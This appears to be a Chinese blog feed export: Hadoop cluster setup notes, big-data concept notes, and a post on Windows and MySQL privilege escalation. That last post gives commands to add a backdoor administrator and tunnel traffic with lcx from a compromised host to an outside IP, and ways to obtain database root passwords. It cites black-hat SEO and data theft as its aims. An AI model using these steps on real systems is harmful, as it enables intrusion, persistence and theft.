<h2 id="2-6-配置Hadoop集群"><a href="#2-6-配置Hadoop集群" class="headerlink" title="2.6-配置Hadoop集群"></a>2.6-配置Hadoop集群</h2><h3 id="2-6-1-修改相关文件"><a href="#2-6-1-修改相关文件" class="headerlink" title="2.6.1-修改相关文件"></a>2.6.1-修改相关文件</h3><ul>
<li><p>相关文件，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hadoop-2.6.0/etc/hadoop/hadoop-env.sh</span><br><span class="line">hadoop-2.6.0/etc/hadoop/yarn-env.sh</span><br><span class="line">hadoop-2.6.0/etc/hadoop/core-site.xml</span><br><span class="line">hadoop-2.6.0/etc/hadoop/hdfs-site.xml</span><br><span class="line">hadoop-2.6.0/etc/hadoop/mapred-site.xml</span><br><span class="line">hadoop-2.6.0/etc/hadoop/yarn-site.xml</span><br><span class="line">hadoop-2.6.0/etc/hadoop/slaves</span><br></pre></td></tr></table></figure>
<ul>
<li>这一步骤仅需要core-site.xml、hdfs-site.xml、slaves</li>
<li>其它配置文件后续再修改</li>
</ul>
</li>
<li><p>core-site.xml，参考代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line"> &lt;property&gt;</span><br><span class="line">   &lt;name&gt;fs.defaultFS&lt;/name&gt;</span><br><span class="line">   &lt;value&gt;hdfs://master:9000&lt;/value&gt;       </span><br><span class="line"> &lt;/property&gt;</span><br><span class="line"> &lt;property&gt;</span><br><span class="line">     &lt;name&gt;hadoop.tmp.dir&lt;/name&gt;</span><br><span class="line">     &lt;value&gt;/home/hadoop/tmp&lt;/value&gt;</span><br><span class="line"> &lt;/property&gt; </span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>注：/home/hadoop/tmp 目录如不存在，则先mkdir手动创建</p>
</li>
<li><p>xml后缀的配置文件格式很重要，空格空行也会影响其正确性</p>
</li>
<li><p>主要便是修改property中的name和value</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>hdfs-site.xml，参考代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">     &lt;property&gt;</span><br><span class="line">       &lt;name&gt;dfs.datanode.ipc.address&lt;/name&gt;</span><br><span class="line">       &lt;value&gt;0.0.0.0:50020&lt;/value&gt;</span><br><span class="line">     &lt;/property&gt;</span><br><span class="line">     &lt;property&gt;</span><br><span class="line">       &lt;name&gt;dfs.datanode.http.address&lt;/name&gt;</span><br><span class="line">       &lt;value&gt;0.0.0.0:50075&lt;/value&gt;</span><br><span class="line">    &lt;/property&gt;  </span><br><span class="line">&lt;property&gt;</span><br><span class="line">&lt;name&gt;dfs.namenode.name.dir&lt;/name&gt;</span><br><span class="line">&lt;value&gt;file:/home/hadoop/data/namenode&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">&lt;name&gt;dfs.datanode.data.dir&lt;/name&gt;</span><br><span class="line">&lt;value&gt;file:/home/hadoop/data/datanode&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">&lt;name&gt;dfs.namenode.secondary.http-address&lt;/name&gt;</span><br><span class="line">&lt;value&gt;slave1:9001&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;    </span><br><span class="line">    &lt;property&gt;</span><br><span class="line">      &lt;name&gt;dfs.replication&lt;/name&gt;</span><br><span class="line">      &lt;value&gt;1&lt;/value&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">  &lt;property&gt; </span><br><span class="line">   &lt;name&gt;dfs.permissions&lt;/name&gt; </span><br><span class="line">     &lt;value&gt;false&lt;/value&gt; </span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"> &lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>master上删掉：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">&lt;name&gt;dfs.namenode.secondary.http-address&lt;/name&gt;</span><br><span class="line">&lt;value&gt;slave1:9001&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>master有会出错，但slava上删掉也会出错</li>
<li>master上无，slave上有（原因未知，记一下</li>
</ul>
</li>
</ul>
</li>
<li><p>slaves</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">master</span><br><span class="line">slave1</span><br><span class="line">slave2</span><br></pre></td></tr></table></figure>
<ul>
<li>这样master，slave1，slave2上都有datanode进程</li>
<li>一般情况，master上没有datanode，自己测试而已，故也加上</li>
</ul>
</li>
</ul>
<h3 id="2-6-2-分发到集群的其它主机"><a href="#2-6-2-分发到集群的其它主机" class="headerlink" title="2.6.2-分发到集群的其它主机"></a>2.6.2-分发到集群的其它主机</h3><ul>
<li><p>把hadoop-2.6.0文件夹连同修改后的配置文件，通过scp拷贝到其它2台机器上</p>
<p><code>$scp -r hadoop-2.6.0/  hadoop@slave1: hadoop-2.6.0</code></p>
</li>
</ul>
<h3 id="2-6-3-测试"><a href="#2-6-3-测试" class="headerlink" title="2.6.3-测试"></a>2.6.3-测试</h3><ul>
<li><p>格式化</p>
<p><code>hdfs namenode -format</code></p>
</li>
<li><p>启动dfs</p>
<p><code>$HADOOP_HOME/sbin/start-dfs.sh</code></p>
</li>
<li><p><code>jps</code>查看运行的java进程</p>
</li>
<li><p>若配置成功</p>
<ul>
<li><p>master</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Jps</span><br><span class="line">SecondaryNameNode</span><br><span class="line">DataNode</span><br><span class="line">NameNode</span><br></pre></td></tr></table></figure>
</li>
<li><p>slave</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Jps</span><br><span class="line">DataNode</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h1 id="03-mapreduce、yarn相关配置"><a href="#03-mapreduce、yarn相关配置" class="headerlink" title="03-mapreduce、yarn相关配置"></a>03-mapreduce、yarn相关配置</h1><p>在master上配置</p>
<ul>
<li><p>mapred-site.xml，参考代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;property&gt;</span><br><span class="line">      &lt;name&gt;mapreduce.framework.name&lt;/name&gt;</span><br><span class="line">      &lt;value&gt;yarn&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">        &lt;name&gt;mapreduce.jobhistory.address&lt;/name&gt;</span><br><span class="line">        &lt;value&gt;master:10020&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">        &lt;name&gt;mapreduce.jobhistory.webapp.address&lt;/name&gt;</span><br><span class="line">        &lt;value&gt;master:19888&lt;/value&gt;</span><br><span class="line"> &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>先执行<code>cp mapred-site.xml.template mapred-site-xml</code></li>
<li>根据需要，添加新property即可，不需要的可以自行删除</li>
</ul>
</li>
<li><p>yarn-site-xml，参考代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line"></span><br><span class="line">&lt;configuration&gt;</span><br><span class="line"></span><br><span class="line">&lt;property&gt;</span><br><span class="line">&lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt;</span><br><span class="line">&lt;value&gt;mapreduce_shuffle&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">&lt;name&gt;yarn.nodemanager.aux-services.mapreduce.shuffle.class&lt;/name&gt;</span><br><span class="line">&lt;value&gt;org.apache.hadoop.mapred.ShuffleHandler&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动dfs和yarn，<code>start-dfs.sh</code>和<code>start-yarn.sh</code>或直接<code>start-all.sh</code></p>
</li>
<li><p>jps检验是否成功，若如下，则成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ry@ubuntu:~$ jps</span><br><span class="line">7249 Jps</span><br><span class="line">16745 SecondaryNameNode</span><br><span class="line">16539 DataNode</span><br><span class="line">6829 ResourceManager</span><br><span class="line">16414 NameNode</span><br><span class="line">6943 NodeManager</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="04-eclipse相关配置"><a href="#04-eclipse相关配置" class="headerlink" title="04-eclipse相关配置"></a>04-eclipse相关配置</h1><p>待续……</p>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>大数据学习01_相关概念</title>
    <url>/2018/01/22/etc/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A001-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
    <content><![CDATA[<h1 id="01-大数据基本概念"><a href="#01-大数据基本概念" class="headerlink" title="01-大数据基本概念"></a>01-大数据基本概念</h1><h2 id="1-1-大数据特点5Vs"><a href="#1-1-大数据特点5Vs" class="headerlink" title="1.1-大数据特点5Vs"></a>1.1-大数据特点5Vs</h2><ul>
<li>数据体量巨大(Volume)</li>
<li>数据类型繁多(Variety)<ul>
<li>结构化</li>
<li>非结构化</li>
</ul>
</li>
<li>价值密度低(Value)<ul>
<li>价值密度的高低与数据总量的大小成反比</li>
</ul>
</li>
<li>处理速度快(Velocity)<ul>
<li>区分于传统数据挖掘的最显著特征</li>
</ul>
</li>
<li>真实性（Veracity）<ul>
<li>分析并过滤资料有偏差、伪造、异常的部分</li>
<li>防止「dirty data」损害到资料系统的完整跟正确性，进而影响决策。</li>
</ul>
</li>
</ul>
<a id="more"></a>
<h2 id="1-2-数据仓库相关"><a href="#1-2-数据仓库相关" class="headerlink" title="1.2-数据仓库相关"></a>1.2-数据仓库相关</h2><blockquote>
<p>参考：<code>https://www.cnblogs.com/eva_2010/archive/2011/06/09/2076392.html</code></p>
</blockquote>
<h3 id="1-2-1-企业的数据处理"><a href="#1-2-1-企业的数据处理" class="headerlink" title="1.2.1-企业的数据处理"></a>1.2.1-企业的数据处理</h3><ul>
<li>操作型处理<ul>
<li>联机事务处理（OnLine Transaction Processing，OLTP）</li>
<li>面向日常的数据处理</li>
<li>用户是一般业务人员</li>
<li>处理性能高，响应快</li>
<li>数据松散，缺乏一致性及准确性</li>
</ul>
</li>
<li>分析型处理<ul>
<li>面向分析、支持决策的</li>
<li>用户多是管理人员</li>
<li>系统资源消耗多，不要求快</li>
<li>经过加工处理后的数据，更加全面准确</li>
</ul>
</li>
</ul>
<h3 id="1-2-2-数据仓库"><a href="#1-2-2-数据仓库" class="headerlink" title="1.2.2-数据仓库"></a>1.2.2-数据仓库</h3><ul>
<li>设计初衷：操作型系统过渡到决策支持系统的工具或集成环境</li>
<li>尝试解决数据流相关的各种问题<ul>
<li>如何从传统的操作型处理系统中提取与决策主题相关的数据</li>
<li>如何经过转换把分散的、不一致的业务数据转换成集成的、低噪声的数据</li>
</ul>
</li>
<li>特征<ul>
<li>面向主题的（Subject-Oriented ）</li>
<li>集成的（Integrated）</li>
<li>非易失的（Non-Volatile）</li>
<li>时变的（Time-Variant ）</li>
</ul>
</li>
<li>数据仓库不是可以买到的产品，而是一种面向分析的数据存储方案</li>
<li>从两个层次理解<ul>
<li>数据仓库用于支持决策，面向分析型数据处理，不同于提高业务效率的操作型数据库</li>
<li>数据仓库对分布在企业中的多个异构数据源集成，按照决策主题选择数据并以新的数据模型存储</li>
</ul>
</li>
<li>存储在数据仓库中的数据一般不能修改</li>
</ul>
<h2 id="1-3-ETL与DataMine"><a href="#1-3-ETL与DataMine" class="headerlink" title="1.3-ETL与DataMine"></a>1.3-ETL与DataMine</h2><h3 id="1-3-1-ETL"><a href="#1-3-1-ETL" class="headerlink" title="1.3.1-ETL"></a>1.3.1-ETL</h3><ul>
<li>Extract（抽取）-Transform（转换）-Load（加载） </li>
<li>其设计分三部分：数据抽取、数据的清洗转换、数据的加载</li>
<li>ETL是将业务系统的数据经过抽取、清洗转换之后加载到数据仓库的过程，目的是将企业中的分散、零乱、标准不统一的数据整合到一起，为企业的决策提供分析依据</li>
<li>常用三种实现方法<ul>
<li>借助ETL工具(如Oracle的OWB</li>
<li>SQL方式实现</li>
<li>ETL工具和SQL相结合</li>
</ul>
</li>
<li>相关链接<ul>
<li><code>https://www.cnblogs.com/yjd_hycf_space/p/7772722.html</code></li>
<li><code>http://blog.csdn.net/xiaohai798/article/details/34188549</code></li>
</ul>
</li>
</ul>
<h3 id="1-3-2-Datamine"><a href="#1-3-2-Datamine" class="headerlink" title="1.3.2-Datamine"></a>1.3.2-Datamine</h3><ul>
<li>即数据挖掘，就是指从数据中获取知识</li>
<li>两大基本目标<ul>
<li>预测数据</li>
<li>描述数据</li>
<li>其中前者的计算机建模及实现过程通常被称为监督学习(supervised learning)，后者的则通常被称为无监督学习(supervised learning)</li>
</ul>
</li>
<li>相关链接：<ul>
<li><code>https://www.cnblogs.com/muchen/p/5434359.html#_label0</code></li>
</ul>
</li>
</ul>
<h2 id="1-4-深度学习-amp-机器学习-amp-人工智能"><a href="#1-4-深度学习-amp-机器学习-amp-人工智能" class="headerlink" title="1.4-深度学习&amp;机器学习&amp;人工智能"></a>1.4-深度学习&amp;机器学习&amp;人工智能</h2><ul>
<li>三者关系<ul>
<li>机器学习是人工智能的子集</li>
<li>深度学习是机器学习的子集</li>
<li>“同心圆”关系</li>
</ul>
</li>
<li>人工智能<ul>
<li>Artificial Intelligence, AI</li>
<li>由人工制造出来的系统所表现出来的智能。</li>
<li>通常人工智能是指通过普通电脑实现的智能</li>
</ul>
</li>
<li>机器学习<ul>
<li>Machine Learning，是人工智能的一个分支</li>
<li>机器学习是实现人工智能的一个途径，即以机器学习为手段解决人工智能中的问题。</li>
</ul>
</li>
<li>深度学习<ul>
<li>Deep Learning，是机器学习拉出的分支</li>
<li>深度学习是机器学习中一种基于对数据进行表征学习的方法</li>
<li>深度学习使得机器学习能够实现众多的应用，并拓展了人工智能的领域范围</li>
</ul>
</li>
</ul>
<h2 id="1-5-Hadoop"><a href="#1-5-Hadoop" class="headerlink" title="1.5-Hadoop"></a>1.5-Hadoop</h2><ul>
<li>Hadoop是一个对海量数据进行处理的分布式系统架构，可以理解为Hadoop就是一个对大量的数据进行分析的工具，和其他组件搭配使用，来完成对大量数据的收集、存储和计算。</li>
<li>Hadoop框架最核心的设计就是：HDFS 和 MapReduce。</li>
<li>HDFS为海量的数据提供了存储；MapReduce为海量的数据提供了计算。</li>
</ul>
<p>—————————-分割线——————————————————</p>
<h1 id="02-分布式基本概念"><a href="#02-分布式基本概念" class="headerlink" title="02-分布式基本概念"></a>02-分布式基本概念</h1><h2 id="2-1-CAP原理"><a href="#2-1-CAP原理" class="headerlink" title="2.1-CAP原理"></a>2.1-CAP原理</h2><ul>
<li>指的是在一个分布式系统中，Consistency（一致性）、 Availability（可用性）、Partition tolerance（分区容错性）<ul>
<li>一致性（C）：数据一致更新，所有数据变动都是同步的</li>
<li>可用性（A）：在集群中一部分节点故障后，集群整体是否还能响应客户端的读写请求。</li>
<li>分区容错性（P）：以实际效果而言，分区相当于对通信的时限要求。系统如果不能在时限内达成数据一致性，就意味着发生了分区的情况，必须就当前操作在C和A之间做出选择。</li>
</ul>
</li>
<li>CAP原理指的是，这三个要素最多只能同时实现两点，不可能三者兼顾</li>
<li>架构师不要将精力浪费在如何设计能满足三者的完美分布式系统，而是应该进行取舍。</li>
<li>对于分布式数 据系统，分区容忍性是基本要求 ，否则就失去了价值。因此设计分布式数据系统，就是在一致性和可用性之间取一个平衡。</li>
</ul>
<h2 id="2-2-BASE原理"><a href="#2-2-BASE原理" class="headerlink" title="2.2-BASE原理"></a>2.2-BASE原理</h2><ul>
<li>BASE<ul>
<li>Basically Available（基本可用）</li>
<li>Soft state（软状态）</li>
<li>Eventually consistent（最终一致性）</li>
</ul>
</li>
<li>BASE是对CAP中一致性和可用性权衡的结果，其来源于对大规模互联网系统分布式实践的结论，是基于CAP定理逐步演化而来的</li>
<li>其核心思想是即使无法做到强一致性（Strong consistency），但每个应用都可以根据自身的业务特点，采用适当的方式来使系统达到最终一致性（Eventual consistency）。</li>
</ul>
<h2 id="2-3-数据分割"><a href="#2-3-数据分割" class="headerlink" title="2.3-数据分割"></a>2.3-数据分割</h2><ul>
<li>数据分割是指把逻辑上是统一整体的<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE/5947370" target="_blank" rel="noopener">数据</a>分割成较小的、可以独立管理的物理单元进行存储，以便于<a href="https://baike.baidu.com/item/%E9%87%8D%E6%9E%84/2182519" target="_blank" rel="noopener">重构</a>、重组和恢复，以提高创建<a href="https://baike.baidu.com/item/%E7%B4%A2%E5%BC%95/5716853" target="_blank" rel="noopener">索引</a>和顺序扫描的效率</li>
<li>数据分割使<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E4%BB%93%E5%BA%93" target="_blank" rel="noopener">数据仓库</a>的开发人员和使用者具有更大的灵活性。</li>
<li>水平分割<ul>
<li>水平分割(Horizontal Splitting)就是把全局关系的元组分割成一些子集，这些子集被称为数据分片或段(Fragment)。</li>
<li>数据分片中的数据可能是由于某种共同的性质(如地理、归属)而需要聚集一起的。</li>
<li>通常，一个关系中的数据分片是互不相交的，这些分片可以选择地放在一个站点上，也可以通过副本被重复放在不同的站点上。</li>
</ul>
</li>
<li>垂直分割<ul>
<li>垂直分割(Vertical Splitting)就是把全局关系按着属性组(纵向)分割成一些数据分片或段(Fragment)。</li>
<li>数据分片中的数据可能是由于使用上的方便或访问的共同性而需要聚集一起的</li>
<li>通常，一个关系中的垂直数据分片问只在某些键值上重叠，其他属性是互不相交的。这些垂直分片可以放一个站点上，也可以通过副本被重复放在不同的站点上。</li>
</ul>
</li>
</ul>
<h2 id="2-4-副本策略"><a href="#2-4-副本策略" class="headerlink" title="2.4-副本策略"></a>2.4-副本策略</h2><ul>
<li>副本控制协议可以分为两大类<ul>
<li>中心化副本控制协议primary-secondary</li>
<li>去中心化副本控制协议</li>
</ul>
</li>
<li>primary-secondary中心化副本控制协议的基本思路<ul>
<li>由一个中心节点协调副本数据的更新、维护副本之间的一致性。</li>
<li>所有副本相关的控制交由中心节点完成，并发控制由中心节点完成，从而简化一个分布式并发控制问题为一个单机并发控制问题。</li>
</ul>
</li>
<li>其中有且仅有一个副本作为primary副本，除primary意外的副本都作为secondary副本。维护primary副本的节点作为中心节点，中心节点负责维护数据的更新、并发控制、协同副本的一致性</li>
<li>paxos多个节点直接通过操作日志同步数据，如果只有一个节点称为主节点，就很容易在多个节点之间维护数据一致性。然后主节点可能出现故障，那么就需要选出主节点。Paxos协议就是用于解决多个节点之间的一致性问题。</li>
<li>在paxos算法中，分为4种角色：<ul>
<li>Proposer ：提议者1.Proposer提出议题</li>
<li>Acceptor：决策者2.Acceptor初步接受或者不接受</li>
<li>Client：产生议题者3.若初步接受则Proposer再次向Acceptor确认是否最终接受</li>
<li>Learner：最终决策学习者4.Acceptor最终接受或不接受</li>
</ul>
</li>
</ul>
<p>（PS：概念性的东西还真是令人恼火……</p>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>提权相关</title>
    <url>/2018/01/22/web/%E6%8F%90%E6%9D%83%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<h1 id="提权相关"><a href="#提权相关" class="headerlink" title="提权相关"></a>提权相关</h1><h2 id="01-基础知识"><a href="#01-基础知识" class="headerlink" title="01-基础知识"></a>01-基础知识</h2><ul>
<li>旁注、C段<ul>
<li>旁注：同服务器不同站点的渗透思路</li>
<li>C段：同网段不同服务器的渗透思路</li>
<li>目标站点A无法直接渗透，这个时候我们可以采用旁注查询到目标站点A下的同服站点（同服务器下的其他站点），从而从旁渗透到目标站点（可能会涉及到提权）</li>
<li>如果出现独立服务器（服务器只有一个站点），采用C段，通过查询IP段下的解析站点，渗透某一个服务器，继续进行内网渗透</li>
</ul>
</li>
</ul>
<a id="more"></a>
<ul>
<li>Windows提权常见命令<ul>
<li>Whoami 查看当前操作用户</li>
<li>Ipconfig ip地址获取命令</li>
<li>Net user用户操作命令<ul>
<li>Net user xiaodi 123456 /add 添加用户名xiaodi，密码123456的用户</li>
<li>Net user xiaodi /del 删除用户xiaodi</li>
<li>Net localgroup administrators xiaodi /add 将用户xiaodi添加到本地管理员组</li>
</ul>
</li>
<li>Tasklist /svc 进程获取命令</li>
<li>Netstat -ano 网络端口命令</li>
<li>Systeminfo 计算机信息获取命令</li>
</ul>
</li>
</ul>
<ul>
<li><p>webshell权限和本机操作权限</p>
<ul>
<li><p>Webshell权限小于本机操作权限</p>
</li>
<li><p>图示</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/51544204.jpg" alt></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/84427079.jpg" alt></p>
</li>
</ul>
</li>
<li><p>不同平台下的webshell权限</p>
<ul>
<li><p>IIS平台</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/87219057.jpg" alt></p>
</li>
<li><p>Asp搭建软件</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/84104132.jpg" alt></p>
</li>
</ul>
</li>
<li><p>提权技术分类</p>
<ul>
<li>溢出漏洞提权</li>
<li>数据库提权</li>
<li>第三方软件提权</li>
</ul>
</li>
<li><p>为什么要进行提权？</p>
<ul>
<li>做黑帽seo，修改网站首页文件，无权限修改</li>
<li>做数据，无法获取所有数据，无权限脱裤</li>
<li>做文件窃取，无法获取磁盘指定文件</li>
<li>需要长期控制网站</li>
</ul>
</li>
</ul>
<h2 id="02-windows提权"><a href="#02-windows提权" class="headerlink" title="02-windows提权"></a>02-windows提权</h2><h3 id="1-1-溢出漏洞提权演示"><a href="#1-1-溢出漏洞提权演示" class="headerlink" title="1.1 溢出漏洞提权演示"></a>1.1 溢出漏洞提权演示</h3><ol>
<li><p>提权准备，信息收集</p>
<ul>
<li><p>操作系统版本，操作系统位数，补丁情况，有无防护软件</p>
</li>
<li><p>Systeminfo</p>
<p><code>Windows2003 SP2 X86 32位操作系统 补丁情况：1个</code></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/44172672.jpg" alt></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/10055126.jpg" alt></p>
</li>
<li><p>Tasklist /svc</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/6562665.jpg" alt></p>
</li>
</ul>
</li>
<li><p>对比补丁及操作系统信息，筛选exp</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/28172115.jpg" alt></p>
</li>
<li><p>利用exp进行执行提权</p>
<ul>
<li><p>寻找可读写目录，上传exp（注意：尽量不要带空格的目录</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/48482383.jpg" alt></p>
</li>
<li><p>调用执行exp</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/52207435.jpg" alt></p>
</li>
</ul>
</li>
<li><p>后续提权操作</p>
<ul>
<li><p>添加用户，登录远程连接端口</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/77957481.jpg" alt></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/31535459.jpg" alt></p>
</li>
</ul>
</li>
</ol>
<h3 id="1-2-疑难问题及解决"><a href="#1-2-疑难问题及解决" class="headerlink" title="1.2-疑难问题及解决"></a>1.2-疑难问题及解决</h3><ul>
<li>提权疑难问题：<ul>
<li>Cmd无法执行</li>
<li>3389无法连接</li>
<li>Exp执行失败</li>
</ul>
</li>
</ul>
<h4 id="1-2-1-Cmd无法执行"><a href="#1-2-1-Cmd无法执行" class="headerlink" title="1.2.1-Cmd无法执行"></a>1.2.1-Cmd无法执行</h4><ul>
<li><p>原因分析</p>
<ul>
<li><p>cmd.exe被删除</p>
</li>
<li><p>cmd.exe被降权</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/97514098.jpg" alt></p>
</li>
<li><p>组件删除或禁用</p>
<p>脚本代码要调用文件执行，需要对应的组件支持</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/63926576.jpg" alt></p>
</li>
<li><p>防护软件拦截<br>例如：360，安全狗，D盾等</p>
</li>
</ul>
</li>
<li><p>绕过思路</p>
<ul>
<li><p>寻找可读写目录，上传本地cmd.exe，调用执行</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/35878293.jpg" alt></p>
</li>
</ul>
</li>
</ul>
<h4 id="1-2-2-3389无法连接"><a href="#1-2-2-3389无法连接" class="headerlink" title="1.2.2-3389无法连接"></a>1.2.2-3389无法连接</h4><ul>
<li><p>原因一：端口被修改</p>
<ul>
<li><p>端口被修改</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/83447529.jpg" alt></p>
</li>
</ul>
</li>
<li><p>解决</p>
<ul>
<li><p>PID查询法</p>
<ul>
<li><p>Tasklist /svc 获取对应进程pid号</p>
</li>
<li><p>Netstat -ano 获取指定pid号对应的端口开放情况</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/89205840.jpg" alt></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/69722601.jpg" alt></p>
</li>
</ul>
</li>
<li><p>端口扫描法</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/83167941.jpg" alt></p>
</li>
<li><p>注册表读取法</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/42200264.jpg" alt></p>
</li>
<li></li>
</ul>
</li>
<li><p>原因2：端口被关闭</p>
<ul>
<li>解决：3389开启工具</li>
</ul>
</li>
<li><p>原因3：内网环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A.网吧 B.学校 C.家用路由器 D.拨号上网</span><br><span class="line">A 3389连接B </span><br><span class="line">A 3389连接C</span><br><span class="line">A 3389连接D 可以</span><br><span class="line">B 3389连接A</span><br><span class="line">B 3389连接C</span><br><span class="line">B 3389连接D 可以</span><br><span class="line">C 3389连接A</span><br><span class="line">C 3389连接B</span><br><span class="line">C 3389连接D 可以</span><br><span class="line">D 3389连接A</span><br><span class="line">D 3389连接B</span><br><span class="line">D 3389连接C</span><br></pre></td></tr></table></figure>
<ul>
<li><p>解决办法：端口转发</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">外网服务器</span><br><span class="line">Lcx.exe -listen 1234 4321</span><br><span class="line">内网肉鸡：</span><br><span class="line">Lcx.exe -slave 肉鸡ip 肉鸡端口 外网ip 外网端口</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">外网服务器</span><br><span class="line">Lcx.exe -listen 1234 4321</span><br><span class="line">监听1234端口的流量并将其转发至本地4321端口</span><br><span class="line">内网肉鸡：</span><br><span class="line">lcx.exe -slave 121.43.99.73 1234 192.168.1.106 1111</span><br><span class="line">将本地192.168.1.106的1111端口流量转发至121.43.99.73的1234端口上</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一步：肉鸡 将本地192.168.1.106的1111端口流量转发至121.43.99.73的1234端口上</span><br><span class="line">第二步：外网 监听1234端口的流量并将其转发至本地4321端口</span><br><span class="line">第三步：外网 连接本地端口4321 即代表连接肉鸡的1111端口</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>原因4：防护软件拦截</p>
<p>IP策略及计算机名验证</p>
</li>
</ul>
<h2 id="03-Mysql提权"><a href="#03-Mysql提权" class="headerlink" title="03-Mysql提权"></a>03-Mysql提权</h2><h3 id="3-1-简介"><a href="#3-1-简介" class="headerlink" title="3.1-简介"></a>3.1-简介</h3><ul>
<li>方法<ul>
<li>Udf提权：功能型提权</li>
<li>Mof提权：漏洞型提权</li>
<li>启动项提权：技巧型提权</li>
</ul>
</li>
<li>mysql提权条件：获取最高用户root的密码</li>
<li>获取方式：数据库配置文件、端口破解口令、下载数据库文件获取等<ul>
<li>数据库配置文件<ul>
<li>Config，conn，data，sql，include，common，inc等命名文件</li>
</ul>
</li>
<li>口令猜解<ul>
<li>Hscan，x-scan，hydra，破解脚本等</li>
</ul>
</li>
<li>数据库文件<ul>
<li>由于数据库文件同数据库本身结构一致，导致文件可读取数据</li>
<li>由于root的帐号密码存储在数据库mysql下的user表，所以对应的目录地<br>址../data/mysql/user.myd文件</li>
</ul>
</li>
</ul>
</li>
</ul>
